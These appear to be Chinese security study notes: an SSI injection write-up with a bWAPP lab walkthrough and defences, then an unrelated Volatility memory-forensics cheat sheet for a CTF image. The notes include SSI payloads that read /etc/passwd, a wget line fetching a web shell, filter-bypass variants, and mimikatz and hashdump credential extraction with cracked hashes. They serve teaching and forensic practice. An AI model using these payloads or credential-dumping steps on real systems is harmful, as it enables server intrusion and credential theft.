[IIS SHTML支持设置方法（SSI）](https://www.jb51.net/article/20312.htm)

### SSI基本语法

在SHTML文件中SSI标签使用的几种基本语法如下，必须注意的是其语法格式必须是以html的注释符`<!--`开头、且后面紧接#符号和SSI命令，它们期间不能存在空格：

**1、显示服务器端环境变量`<#echo>`**

本文档名称：`<!--#echo var="DOCUMENT_NAME"-->`

现在时间：`<!--#echo var="DATE_LOCAL"-->`

显示IP地址：`<!--#echo var="REMOTE_ADDR"-->`

**2、将文本内容直接插入到文档中`<#include>`**

```
<!--#include file="文件名称"-->
<!--#include virtual="index.html" -->
<!--#include virtual="文件名称"–>
<!--#include virtual="/www/footer.html" -->
```

注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。

**3、显示WEB文档相关信息`<#flastmod><#fsize>`(如文件制作日期/大小等)**

文件最近更新日期：`<! #flastmod file="文件名称"–>`

文件的长度：`<!--#fsize file="文件名称"-->`

**4、直接执行服务器上的各种程序`<#exec>`(如CGI或其他可执行程序)**

```
<!–#exec cmd="文件名称"–>
<!--#exec cmd="cat /etc/passwd"--
<!–#exec cgi="文件名称"–>
<!--#exec cgi="/cgi-bin/access_log.cgi"–>
```

将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是CGI。

**5、设置SSI信息显示格式`<#config>`(如文件制作日期/大小显示方式)**

**6、高级SSI可设置变量使用if条件语句**

## 0x02 SSI注入漏洞

### 何为SSI注入

SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。

简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。

SSI注入允许远程在Web应用中注入脚本来执行代码。简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。

### 前提条件

攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：

1. Web服务器支持并开启了SSI；
2. Web应用程序在返回HTML页面时，嵌入了用户输入的内容；
3. 外部输入的参数值未进行有效的过滤；

### 漏洞场景

一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。也就是说，用户输入的内容会显示在页面中的场景。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。

从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：

- 文件相关的属性字段
- 当前时间
- 访客IP
- 调用CGI程序

### SSI注入常用命令

这里可以参考OWASP的说明：https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection

#### 命令执行

**Linux**

列出目录文件：

```
<!--#exec cmd="ls" -->
```

访问目录：

```
<!--#exec cmd="cd /root/dir/">
```

执行脚本：

```
<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
```

**Windows**

列出目录文件：

```
<!--#exec cmd="dir" -->
```

访问目录：

```
<!--#exec cmd="cd C:\admin\dir">
```

#### 访问与设置服务器信息

更改错误消息输出：

```
<!--#config errmsg="File not found, informs users and password"-->
```

显示当前文档的文件名：

```
<!--#echo var="DOCUMENT_NAME" -->
```

显示虚拟路径和文件名：

```
<!--#echo var="DOCUMENT_URI" -->
```

使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：

```
<!--#config timefmt="A %B %d %Y %r"-->
```

使用“ fsize”命令，可以打印所选文件的大小：

```
<!--#fsize file="ssi.shtml" -->
```

#### ssinc.dll缓冲区溢出漏洞

在IIS的4.0和5.0版本中，攻击者可以通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统特权。ssinc.dll是用于解释服务器端包含文件的程序。

通过创建包含以下SSI代码的恶意页面并强制Web应用加载该页面（ 路径遍历攻击），可以执行以下攻击：

ssi_over.shtml：

```
<!--#include file="UUUUUUUU...UU"-->
```

注意，字符U的数量必须大于2049。

强制Web应用加载ssi_over.shtml页面：

正常网站：`www.vulnerablesite.org/index.asp?page=news.asp`

恶意网站：`www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml`

如果IIS返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵过程流并执行任意代码。

### Demo

下面直接看BWAPP的SSI注入漏洞环境。

#### Low级

页面是个表单，可以输入First name和Last name，然后提交来查询你的IP地址：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1.png)

随便输入些内容点击Lookup，跳转至新的页面：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2.png)

可看到该页面是shtml页面，并且用户输入的表单信息直接输出在该页面上。

当然，我们输入XSS payload，就会弹框了，后台没有进行任何过滤：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/3.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4.png)

这就满足前面所说的场景了，该页面是SHTML文件，且存在反射型XSS，同时我们可以推测服务端是开启SSI的（因为对IP地址进行了查询操作并输出在页面上），那么该页面时大概率存在SSI注入漏洞的。

下面来验证一下，直接输入执行系统命令的SSI标签：

```
<!--#exec cmd="whoami"-->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/6.png)

据此，我们就可以知道，下面显示lookup结果的IP地址的SSI标签为`<!--#echo var="REMOTE_ADDR"-->`。

#### Medium级

该级别下XSS不能通过引号来将字符串括起来再弹框输出，因为后台程序在引号前添加了反斜杠进行了转义：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/10.png)

但是输入数字和用/括起来的字符串还是能正常输出的：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11.png)

即目前可知，后台程序对引号都进行了转义的出来。

意料之中，Low级SSI注入的payload输进去后没执行成功：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7.png)

一个个字符尝试，从XSS能注入的话是发现尖括号`<>`是没有被过滤的；接着对着之前的payload逐个字符去掉，发现将双引号去掉就能执行了：

```
<!--#exec cmd=whoami -->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png)

虽然可以执行whoami命令，但是对于需要参数输入的命令是没办法执行了的，因为没有引号将整条命令括起来而中间存在空格，这样后台是没办法识别出整条命令的。

那么尝试将双引号替换为单引号，同样失效；这时可以想象平时进行命令注入利用的时候，我们可以利用哪些特殊字符，如换行符\n、反引号`、分号;、管道符|、与运算符&等等，逐一尝试，最后发现反引号成功执行命令：

```
<!--#exec cmd=`cat /etc/passwd`-->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/9.png)

#### High级

此级别下，后台程序对输入的内容进行了HTML编码后才输出到页面中，即完全防御住了XSS漏洞，同时也让SSI注入无法成功进行：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13.png)

最为重要的尖括号`<>`都被HTML编码了，那就不可能再插入标签了，而SSI注入就是注入标签，这下啥戏都没有了。

这也从另一方面说明，成功防御XSS漏洞的HTML输出编码也能够有效防御SSI注入漏洞。

#### 源码简析

在ssii.php中，关键代码如下，不同级别下xss()函数中调用的过滤函数是不一样的：

```
include("security.php");
include("security_level_check.php");
include("functions_external.php");
include("selections.php");

$field_empty = 0;

function xss($data)
{

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $data = no_check($data);
            break;

        case "1" :

            $data = xss_check_4($data);
            break;

        case "2" :

            $data = xss_check_3($data);
            break;

        default :

            $data = no_check($data);
            break;

    }       

    return $data;

}

if(isset($_POST["form"]))
{

    $firstname = ucwords(xss($_POST["firstname"]));
    $lastname = ucwords(xss($_POST["lastname"]));

    if($firstname == "" or $lastname == "")
    {

        $field_empty = 1;

    }

    else
    {

        $line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';

        // Writes a new line to the file
        $fp = fopen("ssii.shtml", "w");
        fputs($fp, $line, 200);
        fclose($fp);

        header("Location: ssii.shtml");

        exit;

    }

}
```

下面我们跟到functions_external.php，查看几个防御函数是怎么写的：

```
function no_check($data)
{    
   
    return $data;
        
}

function xss_check_3($data, $encoding = "UTF-8")
{

    // htmlspecialchars - converts special characters to HTML entities    
    // '&' (ampersand) becomes '&amp;' 
    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
    // '<' (less than) becomes '&lt;'
    // '>' (greater than) becomes '&gt;'  
    
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
       
}

function xss_check_4($data)
{
  
    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
    // Do NOT use this for XSS or HTML validations!!!
    
    return addslashes($data);
    
}
```

no_check()函数无任何过滤，对应Low级；xss_check_4()函数调用addslashes()函数进行过滤，即对引号继续转义操作，对应Medium级；xss_check_3()函数调用防御XSS的终极Boss——htmlspecialchars()函数进行过滤，将尖括号等进行了转义，对应High级。

## 0x03 检测与防御

### 检测方法

搜索是否存在.stm,.shtm和.shtml后缀的文件，若存在则进一步判断Web服务是否支持并开启了SSI，若开启了则进一步分析上述后缀的文件中是否存在用户输入内容未经过有效过滤就反射输出到页面中，若有则存在SSI注入漏洞。

### 防御方法

- 若非必须，尽量关闭服务器的SSI功能；
- 对用户的输入进行严格的过滤，过滤相关SSI特殊字符（`<,>,#,-,",'`）；

## 0x04 参考

[服务器端包含注入SSI分析总结](https://www.secpulse.com/archives/66934.html)

# 内存取证

> 参考：https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
>
> 参考：https://blog.csdn.net/m0_68012373/article/details/127419463

## 1. 工具介绍

### 1.1 查看镜像系统

拿到一个内存文件之后，第一步肯定是分析这个内存文件并确定`profile`

`profile`是用来描述特定操作系统内核的数据结构和符号信息的。每个操作系统版本都有一个对应的`profile`，这个`profile`包含了操作系统内核的数据结构布局和重要符号的地址。这些信息对于分析内存镜像非常重要，因为它们可以帮助Volatility理解内存中的数据。

```bash
vol.py -f 文件名 imageinfo

┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/桌面/worldskills3.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80004044070L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff80004045d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-06-10 10:34:38 UTC+0000
     Image local date and time : 2019-06-10 18:34:38 +0800
```

### 1.2 查看进程信息

查看当前正在运行的进程，但是无法查看==被取消进程与活动进程列表的链接（进程）==

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 pslist     
```

psscan 模块不信任进程的链表，而是通过启发式查找代表进程的 EPROCESS 结构来搜索内存。因此，它列出了所有进程，这些进程甚至被 rootkit 隐藏并且没有被 pslist 命令显示或者windows的tasklist命令。

人话：主要用`psscan`就行，能看到更多的东西；并且`psscan`在能看到进程结束时间的基础上还能看到当前相同程序的进程的运行

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 psscan
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Name                PID   PPID PDB                Time created                   Time exited(程序结束时间)                   
------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
0x000000007ec9bb30 PING.EXE           1012   2004 0x0000000026e4c000 2019-06-10 10:32:20 UTC+0000   2019-06-10 10:32:35 UTC+0000  

```

`pstree`可以查看进程与进程之间的关系（父子关系），可通过这个插件来对病毒做朔源

```
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 pstree
```

### 1.3 `procdump` 进程转存

`procdump`可以转存内存镜像中的进程转存为一个可执行文件到本地，后续可以直接将这个文件上传到沙盒做测试来判断有没有病毒

```bash
vol.py -f 文件名 --profile=Win7SP1x64 procdump -p PID值 --dump-dir=输出路径

┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 procdump -p 1216 --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa801b362b30 0x00000000ff500000 svchost.exe          OK: executable.1216.exe
                                                                                      
```

### 1.4 `memdump` 内存转存

`memdump`：提取出指定进程，常用foremost 来分离里面的文件  

需要指定进程` -p [pid]` 和输出目录 -D

`memdump -p 332 -D XX/   `

提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）

dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐

`strings -e l 2040.dmp | grep flag 查找flag`

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 memdump -p 1216 --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing svchost.exe [  1216] to 1216.dmp
```

### 1.5 `modscan` 驱动程序扫描

modscan 命令通过扫描物理内存中的池标记来查找 LDR_DATA_TABLE_ENTRY 结构。这可以获取以前卸载的驱动程序和已被 Rootkit 隐藏/取消链接的驱动程序

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 modscan  
```

### 1.6 `netscan` 内存扫描

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 netscan
```

### 1.7 `malfind` 恶意软件分析

**malfind插件**用于寻找可能注入到各种进程中的恶意软件。使用malfind时也可以使用-p直接指定进程，如果在指定了进程号后没有回显，则表明`malfind`插件认为该进程并没有恶意

![在这里插入图片描述](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjU4MjI0MQ==,size_16,color_FFFFFF,t_70.png)

### 1.8 `hashdump` 查看用户密码

这里需要配合`john`做密码爆破

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 hashdump  
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:29fb61bd2963b1975cf435a2565af910:::
```

完整爆破流程

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 hashdump > hash.txt
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:29fb61bd2963b1975cf435a2565af910:::

# 这里没爆出来
# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)     
1g 0:00:00:02 DONE (2023-12-02 09:23) 0.3968g/s 5691Kp/s 5691Kc/s 5693KC/s      markinho..index.php.swp
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 

┌──(root㉿kali)-[/home/kali/test]
└─# john --show hash.txt 
0 password hashes cracked, 3 left
```

### 1.9 `lsadump` 查看强密码

如果john爆破不出来，就使用`lsadump`

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 lsadump
Volatility Foundation Volatility Framework 2.6.1
DefaultPassword
0x00000000  4c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   L...............
0x00000010  66 00 6c 00 61 00 67 00 7b 00 34 00 30 00 36 00   f.l.a.g.{.4.0.6.
0x00000020  39 00 39 00 30 00 66 00 66 00 38 00 38 00 66 00   9.9.0.f.f.8.8.f.
0x00000030  31 00 33 00 64 00 61 00 63 00 33 00 63 00 39 00   1.3.d.a.c.3.c.9.
0x00000040  64 00 65 00 62 00 62 00 63 00 30 00 37 00 36 00   d.e.b.b.c.0.7.6.
0x00000050  39 00 35 00 38 00 38 00 63 00 7d 00 00 00 00 00   9.5.8.8.c.}.....

DPAPI_SYSTEM
0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............
0x00000010  01 00 00 00 22 0c 11 ce 0e f5 6b c9 f3 4e 83 b0   ....".....k..N..
0x00000020  8c 0f 9e 75 79 4e 6f 6a 2e 78 8c 18 2e 81 74 3b   ...uyNoj.x....t;
0x00000030  bb 2c 09 a5 bb b2 5d a3 3f 1e 79 09 00 00 00 00   .,....].?.y.....
```

### 1.10 `mimikatz` 插件爆破密码

#### 1.10.1 `mimikatz` 插件安装

> 下载地址：https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins

![image-20231202225815455](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231202225815455.png)

使用`git clone`下载到本地之后将脚本文件复制到Volatility的插件目录

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# cp /home/kali/ctfTool/volatility_plugins/tool-for-CTF/volatility_plugins/lastpass.py /home/kali/vol/volatility/volatility/plugins
```

这里可能会有一个依赖问题，需要安装一个：`construct==2.10.54`，不行用`pip2`试一下

```bash
┌──(kali㉿kali)-[~/volatility/volatility/plugins]
└─$ pip install construct==2.10.54    
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                               
Processing /root/.cache/pip/wheels/af/8e/c5/686cebf634111570b5dde5b340fcff57968f6c57e9d1024a0f/construct-2.10.54-py2-none-any.whl
Installing collected packages: construct
Successfully installed construct-2.10.54
```

#### 1.10.2 `mimikatz` 爆破密码

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mimikatz 
Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  admin            WIN-9FBAEH4UV8C  flag{406990ff88f13dac3c9debbc0769588c}  
wdigest  WIN-9FBAEH4UV8C$ WORKGROUP 
```

### 1.11 `iehistory` 获取系统浏览器搜索过的关键词

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 iehistory
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2208 explorer.exe
Cache type "URL " at 0x3255000
Record length: 0x100
Location: Visited: admin@file:///C:/Users/admin/Desktop/flag.txt
Last modified: 2019-06-07 05:44:58 UTC+0000
Last accessed: 2019-06-07 05:44:58 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0xa0
```

### 1.12 `filescan` 扫描文件

通常配合`grep`使用

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 filescan |grep -E "png|jpg|gif|zip|rar|7z|pdf|txt|doc|flag"
0x000000007f1b6c10     16      0 RW-r-- \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt
```

### 1.13 `dumpfiles` 下载文件

```bash
# volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx(内存地址) -D ./

┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007f1b6c10 -D ./
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x7f1b6c10   None   \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt

┌──(root㉿kali)-[/home/kali/test]
└─# cat file.None.0xfffffa801a879510.dat                                                   
flag{180d163ca48c793cb0db74fb96d6a882}  
```

###  1.14 `notepad` 查看记事本内容

大部分的`profile`都不支持，可以试试`editbox`

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 notepad                              
Volatility Foundation Volatility Framework 2.6.1
```

### 1.15 `editbox` 显示曾经编辑过的内容

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 editbox
Volatility Foundation Volatility Framework 2.6.1
```

### 1.16 `screenshot` 获取桌面截图

这里可能需要一个依赖，先连接香港节点

```bash
proxychains4 pip install Pillow    
```

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 screenshot --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
Wrote ./session_0.Service-0x0-3e7$.Default.png
Wrote ./session_0.Service-0x0-3e4$.Default.png
Wrote ./session_0.Service-0x0-3e5$.Default.png
Wrote ./session_0.msswindowstation.mssrestricteddesk.png
Wrote ./session_0.WinSta0.Default.png
Wrote ./session_0.WinSta0.Disconnect.png
Wrote ./session_0.WinSta0.Winlogon.png
Wrote ./session_1.WinSta0.Default.png
Wrote ./session_1.WinSta0.Disconnect.png
Wrote ./session_1.WinSta0.Winlogon.png
```

### 1.17 `hivelist` 查看注册表

 列出所有的注册表项及其虚拟地址和物理地址

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 hivelist
```

### 1.18 `hivedump` 查看注册键名

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a000024010
```

### 1.9 `printkey` 查看注册表键值

这里以**查看主机名**为例

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2019-06-07 04:34:14 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-9FBAEH4UV8C
```

这里以**列出用户名**为例

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"                
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \SystemRoot\System32\Config\SAM
Key name: Names (S)
Last updated: 2019-06-07 04:37:21 UTC+0000

Subkeys:
  (S) admin
  (S) Administrator
  (S) Guest

Values:
REG_NONE                      : (S) 
```

### 1.20 `timeliner` 查看系统时间线

将所有操作系统事件以时间线的方式展开

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 timeliner
```

### 1.21 `clipboard` 查看剪贴板内容

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 clipboard
```

### 1.22 `mftparser` 恢复被删除的文件

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mftparser |more
```

### 1.23 `envars` 查看环境变量

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 envars
```

### 1.24 `dlllist` 列出某一进程的所有dll文件

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 dlllist -p 2188 
```

### 1.25 `verinfo` 列出程序版本信息

列出PE｜程序版本信息

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 verinfo  
```

### 1.26`shimcache` 从内存文件中找到异常程序植入到系统的开机自启痕迹

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 shimcache
```

### 1.27 `cmdline` 显示进程的命令行参数

`cmdline`可显示进程的启动路径和启动参数

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 cmdline
```

### 1.28 `cmdscan` 查看cmd历史命令

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 cmdscan
```

### 1.29 `consoles`  查看cmd输出结果

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 consoles
```

### 1.30 `mftparser` 查看内存镜像的MFT表

对于NTFS文件系统，会有一个MFT表，单位为1024字节（1K），对于小于或等于1024字节的文件，NTFS会直接将这个文件记录到MFT表中；对于大于1024字节的文件，则会记录这个文件存储位置

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser > mft.txt
```

## 2. 例题

### 2.1 第46届世界技能大赛湖北省选拔赛

```
1、从内存中获取到用户admin的密码并且破解密码，以Flag{admin,password} 形式提交(密码为 6 位)；   
2、获取当前系统 ip 地址及主机名，以 Flag{ip:主机名}形式提交；
3、获取当前系统浏览器搜索过的关键词，作为 Flag 提交；
4、当前系统中存在挖矿进程，请获取指向的矿池地址，以 Flag{ip:端口}形式 提交；
5、恶意进程在系统中注册了服务，请将服务名以 Flag{服务名}形式提交。
```

#### 2.1.1 mimikaze 获取账户密码

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mimikatz       
Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  admin            WIN-9FBAEH4UV8C  flag{406990ff88f13dac3c9debbc0769588c}  
